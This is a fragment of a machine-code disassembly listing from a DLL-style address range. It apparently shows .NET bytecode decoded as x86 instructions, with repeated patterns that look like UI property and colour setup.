10003bb2:	5e                   	pop    %esi
10003bb3:	00 00                	add    %al,(%eax)
10003bb5:	0a 11                	or     (%ecx),%dl
10003bb7:	38 7b 19             	cmp    %bh,0x19(%ebx)
10003bba:	00 00                	add    %al,(%eax)
10003bbc:	04 72                	add    $0x72,%al
10003bbe:	7b 02                	jnp    0x10003bc2
10003bc0:	00 70 6f             	add    %dh,0x6f(%eax)
10003bc3:	35 00 00 0a 11       	xor    $0x110a0000,%eax
10003bc8:	38 7b 19             	cmp    %bh,0x19(%ebx)
10003bcb:	00 00                	add    %al,(%eax)
10003bcd:	04 28                	add    $0x28,%al
10003bcf:	5f                   	pop    %edi
10003bd0:	00 00                	add    %al,(%eax)
10003bd2:	0a 6f 3c             	or     0x3c(%edi),%ch
10003bd5:	00 00                	add    %al,(%eax)
10003bd7:	0a 11                	or     (%ecx),%dl
10003bd9:	38 7b 19             	cmp    %bh,0x19(%ebx)
10003bdc:	00 00                	add    %al,(%eax)
10003bde:	04 72                	add    $0x72,%al
10003be0:	fd                   	std
10003be1:	01 00                	add    %eax,(%eax)
10003be3:	70 22                	jo     0x10003c07
10003be5:	00 00                	add    %al,(%eax)
10003be7:	28 42 73             	sub    %al,0x73(%edx)
10003bea:	60                   	pusha
10003beb:	00 00                	add    %al,(%eax)
10003bed:	0a 6f 61             	or     0x61(%edi),%ch
10003bf0:	00 00                	add    %al,(%eax)
10003bf2:	0a 11                	or     (%ecx),%dl
10003bf4:	38 7b 19             	cmp    %bh,0x19(%ebx)
10003bf7:	00 00                	add    %al,(%eax)
10003bf9:	04 17                	add    $0x17,%al
10003bfb:	6f                   	outsl  %ds:(%esi),(%dx)
10003bfc:	62 00                	bound  %eax,(%eax)
10003bfe:	00 0a                	add    %cl,(%edx)
10003c00:	11 38                	adc    %edi,(%eax)
10003c02:	7b 19                	jnp    0x10003c1d
10003c04:	00 00                	add    %al,(%eax)
10003c06:	04 28                	add    $0x28,%al
10003c08:	5a                   	pop    %edx
10003c09:	00 00                	add    %al,(%eax)
10003c0b:	0a 6f 3a             	or     0x3a(%edi),%ch
10003c0e:	00 00                	add    %al,(%eax)
10003c10:	0a 7e 0e             	or     0xe(%esi),%bh
10003c13:	00 00                	add    %al,(%eax)
10003c15:	04 6f                	add    $0x6f,%al
10003c17:	5d                   	pop    %ebp
10003c18:	00 00                	add    %al,(%eax)
10003c1a:	0a 11                	or     (%ecx),%dl
10003c1c:	38 7b 19             	cmp    %bh,0x19(%ebx)
10003c1f:	00 00                	add    %al,(%eax)
10003c21:	04 6f                	add    $0x6f,%al
10003c23:	5e                   	pop    %esi
10003c24:	00 00                	add    %al,(%eax)
10003c26:	0a 11                	or     (%ecx),%dl
10003c28:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10003c2b:	00 00                	add    %al,(%eax)
10003c2d:	04 72                	add    $0x72,%al
10003c2f:	47                   	inc    %edi
10003c30:	02 00                	add    (%eax),%al
10003c32:	70 6f                	jo     0x10003ca3
10003c34:	35 00 00 0a 11       	xor    $0x110a0000,%eax
10003c39:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10003c3c:	00 00                	add    %al,(%eax)
10003c3e:	04 28                	add    $0x28,%al
10003c40:	5f                   	pop    %edi
10003c41:	00 00                	add    %al,(%eax)
10003c43:	0a 6f 3c             	or     0x3c(%edi),%ch
10003c46:	00 00                	add    %al,(%eax)
10003c48:	0a 11                	or     (%ecx),%dl
10003c4a:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10003c4d:	00 00                	add    %al,(%eax)
10003c4f:	04 72                	add    $0x72,%al
10003c51:	35 02 00 70 22       	xor    $0x22700002,%eax
10003c56:	00 00                	add    %al,(%eax)
10003c58:	80 41 73 60          	addb   $0x60,0x73(%ecx)
10003c5c:	00 00                	add    %al,(%eax)
10003c5e:	0a 6f 61             	or     0x61(%edi),%ch
10003c61:	00 00                	add    %al,(%eax)
10003c63:	0a 11                	or     (%ecx),%dl
10003c65:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10003c68:	00 00                	add    %al,(%eax)
10003c6a:	04 17                	add    $0x17,%al
10003c6c:	6f                   	outsl  %ds:(%esi),(%dx)
10003c6d:	62 00                	bound  %eax,(%eax)
10003c6f:	00 0a                	add    %cl,(%edx)
10003c71:	11 38                	adc    %edi,(%eax)
10003c73:	7b 1b                	jnp    0x10003c90
10003c75:	00 00                	add    %al,(%eax)
10003c77:	04 28                	add    $0x28,%al
10003c79:	5a                   	pop    %edx
10003c7a:	00 00                	add    %al,(%eax)
10003c7c:	0a 6f 3a             	or     0x3a(%edi),%ch
10003c7f:	00 00                	add    %al,(%eax)
10003c81:	0a 7e 0e             	or     0xe(%esi),%bh
10003c84:	00 00                	add    %al,(%eax)
10003c86:	04 6f                	add    $0x6f,%al
10003c88:	5d                   	pop    %ebp
10003c89:	00 00                	add    %al,(%eax)
10003c8b:	0a 11                	or     (%ecx),%dl
10003c8d:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10003c90:	00 00                	add    %al,(%eax)
10003c92:	04 6f                	add    $0x6f,%al
10003c94:	5e                   	pop    %esi
10003c95:	00 00                	add    %al,(%eax)
10003c97:	0a 38                	or     (%eax),%bh
10003c99:	2b 18                	sub    (%eax),%ebx
10003c9b:	00 00                	add    %al,(%eax)
10003c9d:	7e 0e                	jle    0x10003cad
10003c9f:	00 00                	add    %al,(%eax)
10003ca1:	04 16                	add    $0x16,%al
10003ca3:	1f                   	pop    %ds
10003ca4:	78 20                	js     0x10003cc6
10003ca6:	d7                   	xlat   %ds:(%ebx)
10003ca7:	00 00                	add    %al,(%eax)
10003ca9:	00 28                	add    %ch,(%eax)
10003cab:	39 00                	cmp    %eax,(%eax)
10003cad:	00 0a                	add    %cl,(%edx)
10003caf:	6f                   	outsl  %ds:(%esi),(%dx)
10003cb0:	3a 00                	cmp    (%eax),%al
10003cb2:	00 0a                	add    %cl,(%edx)
10003cb4:	11 38                	adc    %edi,(%eax)
10003cb6:	7b 19                	jnp    0x10003cd1
10003cb8:	00 00                	add    %al,(%eax)
10003cba:	04 72                	add    $0x72,%al
10003cbc:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10003cbd:	02 00                	add    (%eax),%al
10003cbf:	70 6f                	jo     0x10003d30
10003cc1:	35 00 00 0a 11       	xor    $0x110a0000,%eax
10003cc6:	38 7b 19             	cmp    %bh,0x19(%ebx)
10003cc9:	00 00                	add    %al,(%eax)
10003ccb:	04 28                	add    $0x28,%al
10003ccd:	5f                   	pop    %edi
10003cce:	00 00                	add    %al,(%eax)
10003cd0:	0a 6f 3c             	or     0x3c(%edi),%ch
10003cd3:	00 00                	add    %al,(%eax)
10003cd5:	0a 11                	or     (%ecx),%dl
10003cd7:	38 7b 19             	cmp    %bh,0x19(%ebx)
10003cda:	00 00                	add    %al,(%eax)
10003cdc:	04 72                	add    $0x72,%al
10003cde:	fd                   	std
10003cdf:	01 00                	add    %eax,(%eax)
10003ce1:	70 22                	jo     0x10003d05
10003ce3:	00 00                	add    %al,(%eax)
10003ce5:	16                   	push   %ss
10003ce6:	43                   	inc    %ebx
10003ce7:	73 60                	jae    0x10003d49
10003ce9:	00 00                	add    %al,(%eax)
10003ceb:	0a 6f 61             	or     0x61(%edi),%ch
10003cee:	00 00                	add    %al,(%eax)
10003cf0:	0a 11                	or     (%ecx),%dl
10003cf2:	38 7b 19             	cmp    %bh,0x19(%ebx)
10003cf5:	00 00                	add    %al,(%eax)
10003cf7:	04 17                	add    $0x17,%al
10003cf9:	6f                   	outsl  %ds:(%esi),(%dx)
10003cfa:	62 00                	bound  %eax,(%eax)
10003cfc:	00 0a                	add    %cl,(%edx)
10003cfe:	11 38                	adc    %edi,(%eax)
10003d00:	7b 19                	jnp    0x10003d1b
10003d02:	00 00                	add    %al,(%eax)
10003d04:	04 28                	add    $0x28,%al
10003d06:	5a                   	pop    %edx
10003d07:	00 00                	add    %al,(%eax)
10003d09:	0a 6f 3a             	or     0x3a(%edi),%ch
10003d0c:	00 00                	add    %al,(%eax)
10003d0e:	0a 7e 0e             	or     0xe(%esi),%bh
10003d11:	00 00                	add    %al,(%eax)
10003d13:	04 6f                	add    $0x6f,%al
10003d15:	5d                   	pop    %ebp
10003d16:	00 00                	add    %al,(%eax)
10003d18:	0a 11                	or     (%ecx),%dl
10003d1a:	38 7b 19             	cmp    %bh,0x19(%ebx)
10003d1d:	00 00                	add    %al,(%eax)
10003d1f:	04 6f                	add    $0x6f,%al
10003d21:	5e                   	pop    %esi
10003d22:	00 00                	add    %al,(%eax)
10003d24:	0a 11                	or     (%ecx),%dl
10003d26:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
10003d29:	00 00                	add    %al,(%eax)
10003d2b:	04 72                	add    $0x72,%al
10003d2d:	ab                   	stos   %eax,%es:(%edi)
10003d2e:	02 00                	add    (%eax),%al
10003d30:	70 6f                	jo     0x10003da1
10003d32:	35 00 00 0a 11       	xor    $0x110a0000,%eax
10003d37:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
10003d3a:	00 00                	add    %al,(%eax)
10003d3c:	04 28                	add    $0x28,%al
10003d3e:	5f                   	pop    %edi
10003d3f:	00 00                	add    %al,(%eax)
10003d41:	0a 6f 3c             	or     0x3c(%edi),%ch
10003d44:	00 00                	add    %al,(%eax)
10003d46:	0a 11                	or     (%ecx),%dl
10003d48:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
10003d4b:	00 00                	add    %al,(%eax)
10003d4d:	04 72                	add    $0x72,%al
10003d4f:	35 02 00 70 22       	xor    $0x22700002,%eax
10003d54:	00 00                	add    %al,(%eax)
10003d56:	a0 41 73 60 00       	mov    0x607341,%al
10003d5b:	00 0a                	add    %cl,(%edx)
10003d5d:	6f                   	outsl  %ds:(%esi),(%dx)
10003d5e:	61                   	popa
10003d5f:	00 00                	add    %al,(%eax)
10003d61:	0a 11                	or     (%ecx),%dl
10003d63:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
10003d66:	00 00                	add    %al,(%eax)
10003d68:	04 17                	add    $0x17,%al
10003d6a:	6f                   	outsl  %ds:(%esi),(%dx)
10003d6b:	62 00                	bound  %eax,(%eax)
10003d6d:	00 0a                	add    %cl,(%edx)
10003d6f:	11 38                	adc    %edi,(%eax)
10003d71:	7b 1a                	jnp    0x10003d8d
10003d73:	00 00                	add    %al,(%eax)
10003d75:	04 28                	add    $0x28,%al
10003d77:	5a                   	pop    %edx
10003d78:	00 00                	add    %al,(%eax)
10003d7a:	0a 6f 3a             	or     0x3a(%edi),%ch
10003d7d:	00 00                	add    %al,(%eax)
10003d7f:	0a 7e 0e             	or     0xe(%esi),%bh
10003d82:	00 00                	add    %al,(%eax)
10003d84:	04 6f                	add    $0x6f,%al
10003d86:	5d                   	pop    %ebp
10003d87:	00 00                	add    %al,(%eax)
10003d89:	0a 11                	or     (%ecx),%dl
10003d8b:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
10003d8e:	00 00                	add    %al,(%eax)
10003d90:	04 6f                	add    $0x6f,%al
10003d92:	5e                   	pop    %esi
10003d93:	00 00                	add    %al,(%eax)
10003d95:	0a 11                	or     (%ecx),%dl
10003d97:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10003d9a:	00 00                	add    %al,(%eax)
10003d9c:	04 72                	add    $0x72,%al
10003d9e:	1b 02                	sbb    (%edx),%eax
10003da0:	00 70 6f             	add    %dh,0x6f(%eax)
10003da3:	35 00 00 0a 11       	xor    $0x110a0000,%eax
10003da8:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10003dab:	00 00                	add    %al,(%eax)
10003dad:	04 28                	add    $0x28,%al
10003daf:	5f                   	pop    %edi
10003db0:	00 00                	add    %al,(%eax)
10003db2:	0a 6f 3c             	or     0x3c(%edi),%ch
10003db5:	00 00                	add    %al,(%eax)
10003db7:	0a 11                	or     (%ecx),%dl
10003db9:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10003dbc:	00 00                	add    %al,(%eax)
10003dbe:	04 72                	add    $0x72,%al
10003dc0:	35 02 00 70 22       	xor    $0x22700002,%eax
10003dc5:	00 00                	add    %al,(%eax)
10003dc7:	90                   	nop
10003dc8:	41                   	inc    %ecx
10003dc9:	73 60                	jae    0x10003e2b
10003dcb:	00 00                	add    %al,(%eax)
10003dcd:	0a 6f 61             	or     0x61(%edi),%ch
10003dd0:	00 00                	add    %al,(%eax)
10003dd2:	0a 11                	or     (%ecx),%dl
10003dd4:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10003dd7:	00 00                	add    %al,(%eax)
10003dd9:	04 17                	add    $0x17,%al
10003ddb:	6f                   	outsl  %ds:(%esi),(%dx)
10003ddc:	62 00                	bound  %eax,(%eax)
10003dde:	00 0a                	add    %cl,(%edx)
10003de0:	11 38                	adc    %edi,(%eax)
10003de2:	7b 1b                	jnp    0x10003dff
10003de4:	00 00                	add    %al,(%eax)
10003de6:	04 28                	add    $0x28,%al
10003de8:	5a                   	pop    %edx
10003de9:	00 00                	add    %al,(%eax)
10003deb:	0a 6f 3a             	or     0x3a(%edi),%ch
10003dee:	00 00                	add    %al,(%eax)
10003df0:	0a 7e 0e             	or     0xe(%esi),%bh
10003df3:	00 00                	add    %al,(%eax)
10003df5:	04 6f                	add    $0x6f,%al
10003df7:	5d                   	pop    %ebp
10003df8:	00 00                	add    %al,(%eax)
10003dfa:	0a 11                	or     (%ecx),%dl
10003dfc:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10003dff:	00 00                	add    %al,(%eax)
10003e01:	04 6f                	add    $0x6f,%al
10003e03:	5e                   	pop    %esi
10003e04:	00 00                	add    %al,(%eax)
10003e06:	0a 38                	or     (%eax),%bh
10003e08:	bc 16 00 00 7e       	mov    $0x7e000016,%esp
10003e0d:	0e                   	push   %cs
10003e0e:	00 00                	add    %al,(%eax)
10003e10:	04 28                	add    $0x28,%al
10003e12:	63 00                	arpl   %eax,(%eax)
10003e14:	00 0a                	add    %cl,(%edx)
10003e16:	6f                   	outsl  %ds:(%esi),(%dx)
10003e17:	3a 00                	cmp    (%eax),%al
10003e19:	00 0a                	add    %cl,(%edx)
10003e1b:	11 38                	adc    %edi,(%eax)
10003e1d:	7b 19                	jnp    0x10003e38
10003e1f:	00 00                	add    %al,(%eax)
10003e21:	04 72                	add    $0x72,%al
10003e23:	a2 03 00 70 6f       	mov    %al,0x6f700003
10003e28:	35 00 00 0a 11       	xor    $0x110a0000,%eax
10003e2d:	38 7b 19             	cmp    %bh,0x19(%ebx)
10003e30:	00 00                	add    %al,(%eax)
10003e32:	04 28                	add    $0x28,%al
10003e34:	5f                   	pop    %edi
10003e35:	00 00                	add    %al,(%eax)
10003e37:	0a 6f 3c             	or     0x3c(%edi),%ch
10003e3a:	00 00                	add    %al,(%eax)
10003e3c:	0a 11                	or     (%ecx),%dl
10003e3e:	38 7b 19             	cmp    %bh,0x19(%ebx)
10003e41:	00 00                	add    %al,(%eax)
10003e43:	04 72                	add    $0x72,%al
10003e45:	f2 03 00             	repnz add (%eax),%eax
10003e48:	70 22                	jo     0x10003e6c
10003e4a:	00 00                	add    %al,(%eax)
10003e4c:	90                   	nop
10003e4d:	41                   	inc    %ecx
10003e4e:	73 60                	jae    0x10003eb0
10003e50:	00 00                	add    %al,(%eax)
10003e52:	0a 6f 61             	or     0x61(%edi),%ch
10003e55:	00 00                	add    %al,(%eax)
10003e57:	0a 11                	or     (%ecx),%dl
10003e59:	38 7b 19             	cmp    %bh,0x19(%ebx)
10003e5c:	00 00                	add    %al,(%eax)
10003e5e:	04 17                	add    $0x17,%al
10003e60:	6f                   	outsl  %ds:(%esi),(%dx)
10003e61:	62 00                	bound  %eax,(%eax)
10003e63:	00 0a                	add    %cl,(%edx)
10003e65:	11 38                	adc    %edi,(%eax)
10003e67:	7b 19                	jnp    0x10003e82
10003e69:	00 00                	add    %al,(%eax)
10003e6b:	04 28                	add    $0x28,%al
10003e6d:	5a                   	pop    %edx
10003e6e:	00 00                	add    %al,(%eax)
10003e70:	0a 6f 3a             	or     0x3a(%edi),%ch
10003e73:	00 00                	add    %al,(%eax)
10003e75:	0a 7e 0e             	or     0xe(%esi),%bh
10003e78:	00 00                	add    %al,(%eax)
10003e7a:	04 6f                	add    $0x6f,%al
10003e7c:	5d                   	pop    %ebp
10003e7d:	00 00                	add    %al,(%eax)
10003e7f:	0a 11                	or     (%ecx),%dl
10003e81:	38 7b 19             	cmp    %bh,0x19(%ebx)
10003e84:	00 00                	add    %al,(%eax)
10003e86:	04 6f                	add    $0x6f,%al
10003e88:	5e                   	pop    %esi
10003e89:	00 00                	add    %al,(%eax)
10003e8b:	0a 11                	or     (%ecx),%dl
10003e8d:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
10003e90:	00 00                	add    %al,(%eax)
10003e92:	04 72                	add    $0x72,%al
10003e94:	04 04                	add    $0x4,%al
10003e96:	00 70 6f             	add    %dh,0x6f(%eax)
10003e99:	35 00 00 0a 11       	xor    $0x110a0000,%eax
10003e9e:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
10003ea1:	00 00                	add    %al,(%eax)
10003ea3:	04 28                	add    $0x28,%al
10003ea5:	5f                   	pop    %edi
10003ea6:	00 00                	add    %al,(%eax)
10003ea8:	0a 6f 3c             	or     0x3c(%edi),%ch
10003eab:	00 00                	add    %al,(%eax)
10003ead:	0a 11                	or     (%ecx),%dl
10003eaf:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
10003eb2:	00 00                	add    %al,(%eax)
10003eb4:	04 72                	add    $0x72,%al
10003eb6:	f2 03 00             	repnz add (%eax),%eax
10003eb9:	70 22                	jo     0x10003edd
10003ebb:	00 00                	add    %al,(%eax)
10003ebd:	90                   	nop
10003ebe:	41                   	inc    %ecx
10003ebf:	73 60                	jae    0x10003f21
10003ec1:	00 00                	add    %al,(%eax)
10003ec3:	0a 6f 61             	or     0x61(%edi),%ch
10003ec6:	00 00                	add    %al,(%eax)
10003ec8:	0a 11                	or     (%ecx),%dl
10003eca:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
10003ecd:	00 00                	add    %al,(%eax)
10003ecf:	04 17                	add    $0x17,%al
10003ed1:	6f                   	outsl  %ds:(%esi),(%dx)
10003ed2:	62 00                	bound  %eax,(%eax)
10003ed4:	00 0a                	add    %cl,(%edx)
10003ed6:	11 38                	adc    %edi,(%eax)
10003ed8:	7b 1a                	jnp    0x10003ef4
10003eda:	00 00                	add    %al,(%eax)
10003edc:	04 28                	add    $0x28,%al
10003ede:	5a                   	pop    %edx
10003edf:	00 00                	add    %al,(%eax)
10003ee1:	0a 6f 3a             	or     0x3a(%edi),%ch
10003ee4:	00 00                	add    %al,(%eax)
10003ee6:	0a 7e 0e             	or     0xe(%esi),%bh
10003ee9:	00 00                	add    %al,(%eax)
10003eeb:	04 6f                	add    $0x6f,%al
10003eed:	5d                   	pop    %ebp
10003eee:	00 00                	add    %al,(%eax)
10003ef0:	0a 11                	or     (%ecx),%dl
10003ef2:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
10003ef5:	00 00                	add    %al,(%eax)
10003ef7:	04 6f                	add    $0x6f,%al
10003ef9:	5e                   	pop    %esi
10003efa:	00 00                	add    %al,(%eax)
10003efc:	0a 11                	or     (%ecx),%dl
10003efe:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10003f01:	00 00                	add    %al,(%eax)
10003f03:	04 72                	add    $0x72,%al
10003f05:	20 04 00             	and    %al,(%eax,%eax,1)
10003f08:	70 6f                	jo     0x10003f79
10003f0a:	35 00 00 0a 11       	xor    $0x110a0000,%eax
10003f0f:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10003f12:	00 00                	add    %al,(%eax)
10003f14:	04 28                	add    $0x28,%al
10003f16:	5f                   	pop    %edi
10003f17:	00 00                	add    %al,(%eax)
10003f19:	0a 6f 3c             	or     0x3c(%edi),%ch
10003f1c:	00 00                	add    %al,(%eax)
10003f1e:	0a 11                	or     (%ecx),%dl
10003f20:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10003f23:	00 00                	add    %al,(%eax)
10003f25:	04 72                	add    $0x72,%al
10003f27:	f2 03 00             	repnz add (%eax),%eax
10003f2a:	70 22                	jo     0x10003f4e
10003f2c:	00 00                	add    %al,(%eax)
10003f2e:	60                   	pusha
10003f2f:	41                   	inc    %ecx
10003f30:	73 60                	jae    0x10003f92
10003f32:	00 00                	add    %al,(%eax)
10003f34:	0a 6f 61             	or     0x61(%edi),%ch
10003f37:	00 00                	add    %al,(%eax)
10003f39:	0a 11                	or     (%ecx),%dl
10003f3b:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10003f3e:	00 00                	add    %al,(%eax)
10003f40:	04 17                	add    $0x17,%al
10003f42:	6f                   	outsl  %ds:(%esi),(%dx)
10003f43:	62 00                	bound  %eax,(%eax)
10003f45:	00 0a                	add    %cl,(%edx)
10003f47:	11 38                	adc    %edi,(%eax)
10003f49:	7b 1b                	jnp    0x10003f66
10003f4b:	00 00                	add    %al,(%eax)
10003f4d:	04 28                	add    $0x28,%al
10003f4f:	5a                   	pop    %edx
10003f50:	00 00                	add    %al,(%eax)
10003f52:	0a 6f 3a             	or     0x3a(%edi),%ch
10003f55:	00 00                	add    %al,(%eax)
10003f57:	0a 7e 0e             	or     0xe(%esi),%bh
10003f5a:	00 00                	add    %al,(%eax)
10003f5c:	04 6f                	add    $0x6f,%al
10003f5e:	5d                   	pop    %ebp
10003f5f:	00 00                	add    %al,(%eax)
10003f61:	0a 11                	or     (%ecx),%dl
10003f63:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10003f66:	00 00                	add    %al,(%eax)
10003f68:	04 6f                	add    $0x6f,%al
10003f6a:	5e                   	pop    %esi
10003f6b:	00 00                	add    %al,(%eax)
10003f6d:	0a 38                	or     (%eax),%bh
10003f6f:	55                   	push   %ebp
10003f70:	15 00 00 7e 0e       	adc    $0xe7e0000,%eax
10003f75:	00 00                	add    %al,(%eax)
10003f77:	04 28                	add    $0x28,%al
10003f79:	63 00                	arpl   %eax,(%eax)
10003f7b:	00 0a                	add    %cl,(%edx)
10003f7d:	6f                   	outsl  %ds:(%esi),(%dx)
10003f7e:	3a 00                	cmp    (%eax),%al
10003f80:	00 0a                	add    %cl,(%edx)
10003f82:	38 41 15             	cmp    %al,0x15(%ecx)
10003f85:	00 00                	add    %al,(%eax)
10003f87:	72 01                	jb     0x10003f8a
10003f89:	00 00                	add    %al,(%eax)
10003f8b:	70 13                	jo     0x10003fa0
10003f8d:	04 20                	add    $0x20,%al
10003f8f:	ec                   	in     (%dx),%al
10003f90:	00 00                	add    %al,(%eax)
10003f92:	00 1f                	add    %bl,(%edi)
10003f94:	70 16                	jo     0x10003fac
10003f96:	28 39                	sub    %bh,(%ecx)
10003f98:	00 00                	add    %al,(%eax)
10003f9a:	0a 13                	or     (%ebx),%dl
10003f9c:	05 11 34 28 5f       	add    $0x5f283411,%eax
10003fa1:	00 00                	add    %al,(%eax)
10003fa3:	0a 7d 21             	or     0x21(%ebp),%bh
10003fa6:	00 00                	add    %al,(%eax)
10003fa8:	04 28                	add    $0x28,%al
10003faa:	5f                   	pop    %edi
10003fab:	00 00                	add    %al,(%eax)
10003fad:	0a 13                	or     (%ebx),%dl
10003faf:	06                   	push   %es
10003fb0:	7e 12                	jle    0x10003fc4
10003fb2:	00 00                	add    %al,(%eax)
10003fb4:	04 13                	add    $0x13,%al
10003fb6:	3a 11                	cmp    (%ecx),%dl
10003fb8:	3a 1c 59             	cmp    (%ecx,%ebx,2),%bl
10003fbb:	45                   	inc    %ebp
10003fbc:	05 00 00 00 05       	add    $0x5000000,%eax
10003fc1:	00 00                	add    %al,(%eax)
10003fc3:	00 33                	add    %dh,(%ebx)
10003fc5:	00 00                	add    %al,(%eax)
10003fc7:	00 62 00             	add    %ah,0x0(%edx)
10003fca:	00 00                	add    %al,(%eax)
10003fcc:	8c 00                	mov    %es,(%eax)
10003fce:	00 00                	add    %al,(%eax)
10003fd0:	ca 00 00             	lret   $0x0
10003fd3:	00 38                	add    %bh,(%eax)
10003fd5:	fa                   	cli
10003fd6:	00 00                	add    %al,(%eax)
10003fd8:	00 72 dd             	add    %dh,-0x23(%edx)
10003fdb:	04 00                	add    $0x0,%al
10003fdd:	70 13                	jo     0x10003ff2
10003fdf:	04 20                	add    $0x20,%al
10003fe1:	ec                   	in     (%dx),%al
10003fe2:	00 00                	add    %al,(%eax)
10003fe4:	00 1f                	add    %bl,(%edi)
10003fe6:	70 16                	jo     0x10003ffe
10003fe8:	28 39                	sub    %bh,(%ecx)
10003fea:	00 00                	add    %al,(%eax)
10003fec:	0a 13                	or     (%ebx),%dl
10003fee:	05 11 34 28 5f       	add    $0x5f283411,%eax
10003ff3:	00 00                	add    %al,(%eax)
10003ff5:	0a 7d 21             	or     0x21(%ebp),%bh
10003ff8:	00 00                	add    %al,(%eax)
10003ffa:	04 28                	add    $0x28,%al
10003ffc:	5f                   	pop    %edi
10003ffd:	00 00                	add    %al,(%eax)
10003fff:	0a 13                	or     (%ebx),%dl
10004001:	06                   	push   %es
10004002:	38 cc                	cmp    %cl,%ah
10004004:	00 00                	add    %al,(%eax)
10004006:	00 72 e7             	add    %dh,-0x19(%edx)
10004009:	04 00                	add    $0x0,%al
1000400b:	70 13                	jo     0x10004020
1000400d:	04 20                	add    $0x20,%al
1000400f:	cc                   	int3
10004010:	00 00                	add    %al,(%eax)
10004012:	00 1f                	add    %bl,(%edi)
10004014:	09 1f                	or     %ebx,(%edi)
10004016:	2f                   	das
10004017:	28 39                	sub    %bh,(%ecx)
10004019:	00 00                	add    %al,(%eax)
1000401b:	0a 13                	or     (%ebx),%dl
1000401d:	05 11 34 28 5f       	add    $0x5f283411,%eax
10004022:	00 00                	add    %al,(%eax)
10004024:	0a 7d 21             	or     0x21(%ebp),%bh
10004027:	00 00                	add    %al,(%eax)
10004029:	04 28                	add    $0x28,%al
1000402b:	5f                   	pop    %edi
1000402c:	00 00                	add    %al,(%eax)
1000402e:	0a 13                	or     (%ebx),%dl
10004030:	06                   	push   %es
10004031:	38 9d 00 00 00 72    	cmp    %bl,0x72000000(%ebp)
10004037:	f9                   	stc
10004038:	04 00                	add    $0x0,%al
1000403a:	70 13                	jo     0x1000404f
1000403c:	04 20                	add    $0x20,%al
1000403e:	ec                   	in     (%dx),%al
1000403f:	00 00                	add    %al,(%eax)
10004041:	00 16                	add    %dl,(%esi)
10004043:	16                   	push   %ss
10004044:	28 39                	sub    %bh,(%ecx)
10004046:	00 00                	add    %al,(%eax)
10004048:	0a 13                	or     (%ebx),%dl
1000404a:	05 11 34 28 5f       	add    $0x5f283411,%eax
1000404f:	00 00                	add    %al,(%eax)
10004051:	0a 7d 21             	or     0x21(%ebp),%bh
10004054:	00 00                	add    %al,(%eax)
10004056:	04 28                	add    $0x28,%al
10004058:	5f                   	pop    %edi
10004059:	00 00                	add    %al,(%eax)
1000405b:	0a 13                	or     (%ebx),%dl
1000405d:	06                   	push   %es
1000405e:	2b 73 72             	sub    0x72(%ebx),%esi
10004061:	0d 05 00 70 13       	or     $0x13700005,%eax
10004066:	04 20                	add    $0x20,%al
10004068:	ff 00                	incl   (%eax)
1000406a:	00 00                	add    %al,(%eax)
1000406c:	20 ed                	and    %ch,%ch
1000406e:	00 00                	add    %al,(%eax)
10004070:	00 16                	add    %dl,(%esi)
10004072:	28 39                	sub    %bh,(%ecx)
10004074:	00 00                	add    %al,(%eax)
10004076:	0a 13                	or     (%ebx),%dl
10004078:	05 11 34 16 1f       	add    $0x1f163411,%eax
1000407d:	38 20                	cmp    %ah,(%eax)
1000407f:	82 00 00             	addb   $0x0,(%eax)
10004082:	00 28                	add    %ch,(%eax)
10004084:	39 00                	cmp    %eax,(%eax)
10004086:	00 0a                	add    %cl,(%edx)
10004088:	7d 21                	jge    0x100040ab
1000408a:	00 00                	add    %al,(%eax)
1000408c:	04 16                	add    $0x16,%al
1000408e:	1f                   	pop    %ds
1000408f:	38 20                	cmp    %ah,(%eax)
10004091:	82 00 00             	addb   $0x0,(%eax)
10004094:	00 28                	add    %ch,(%eax)
10004096:	39 00                	cmp    %eax,(%eax)
10004098:	00 0a                	add    %cl,(%edx)
1000409a:	13 06                	adc    (%esi),%eax
1000409c:	2b 35 72 2d 05 00    	sub    0x52d72,%esi
100040a2:	70 13                	jo     0x100040b7
100040a4:	04 16                	add    $0x16,%al
100040a6:	1f                   	pop    %ds
100040a7:	66 20 b3 00 00 00 28 	data16 and %dh,0x28000000(%ebx)
100040ae:	39 00                	cmp    %eax,(%eax)
100040b0:	00 0a                	add    %cl,(%edx)
100040b2:	13 05 11 34 28 5f    	adc    0x5f283411,%eax
100040b8:	00 00                	add    %al,(%eax)
100040ba:	0a 7d 21             	or     0x21(%ebp),%bh
100040bd:	00 00                	add    %al,(%eax)
100040bf:	04 20                	add    $0x20,%al
100040c1:	f7 00 00 00 20 90    	testl  $0x90200000,(%eax)
100040c7:	00 00                	add    %al,(%eax)
100040c9:	00 1f                	add    %bl,(%edi)
100040cb:	1e                   	push   %ds
100040cc:	28 39                	sub    %bh,(%ecx)
100040ce:	00 00                	add    %al,(%eax)
100040d0:	0a 13                	or     (%ebx),%dl
100040d2:	06                   	push   %es
100040d3:	7e 0e                	jle    0x100040e3
100040d5:	00 00                	add    %al,(%eax)
100040d7:	04 11                	add    $0x11,%al
100040d9:	05 6f 3a 00 00       	add    $0x3a6f,%eax
100040de:	0a 28                	or     (%eax),%ch
100040e0:	45                   	inc    %ebp
100040e1:	00 00                	add    %al,(%eax)
100040e3:	0a 6f 46             	or     0x46(%edi),%ch
100040e6:	00 00                	add    %al,(%eax)
